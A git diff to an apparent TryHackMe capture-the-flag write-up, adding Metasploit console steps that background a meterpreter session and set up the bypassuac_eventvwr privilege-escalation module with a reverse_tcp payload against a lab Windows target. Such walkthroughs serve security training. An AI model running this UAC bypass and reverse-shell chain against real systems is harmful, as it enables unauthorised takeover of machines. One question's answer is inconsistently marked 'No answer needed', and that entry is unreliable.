@@ -280,7 +280,7 @@ meterpreter ></code></pre>
 <br>
 
 > 4.6. <em>Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?</em><br><a id='4.6'></a>
->> <code><strong>No answer needed</strong></code>
+>> <code><strong>exploit/windows/local/bypassuac_eventvwr</strong></code>
 
 <br>
 
@@ -288,6 +288,92 @@ meterpreter ></code></pre>
 
 
 <br>
+
+> 4.7. <em>Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.</em><br><a id='4.7'></a>
+>> <code><strong>No answer needed</strong></code>
+
+<br>
+
+<pre><code>meterpreter > meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/http/icecast_header) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  [THM AttackBox IP]:[THM AttackBox Port] -> [Target IP]:[Target Port] ([Target IP])
+
+msf6 exploit(windows/http/icecast_header) > 
+</code></pre>
+
+<br>
+
+> 4.8. <em>Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`.</em><br><a id='4.8'></a>
+>> <code><strong>No answer needed</strong></code>
+
+<br>
+
+<pre><code>meterpreter > msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_eventvwr) > 
+</code></pre>
+
+<br>
+
+> 4.9. <em>Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`.</em><br><a id='4.8'></a>
+>> <code><strong>No answer needed</strong></code>
+
+<br>
+
+<pre><code>msf6 exploit(windows/local/bypassuac_eventvwr) > show options
+
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     [THM AttackBox IP]    yes       The listen address (an interface may be specified)
+   LPORT     [THM AttackBox Port]              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > 
+</code></pre>
+
+
+<br>
+
+> 4.10. <em>Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?</em><br><a id='4.8'></a>
+>> <code><strong>No answer needed</strong></code>
+
+<br>
+
+<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/01be97a2-9236-4cf8-8aa8-caca8bf0309e"> </p>
+
+<br>
+
+<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/0f5fefb5-451e-47c2-bb2c-1123666627cb"> </p>
+
+<br>
+
 
 
 
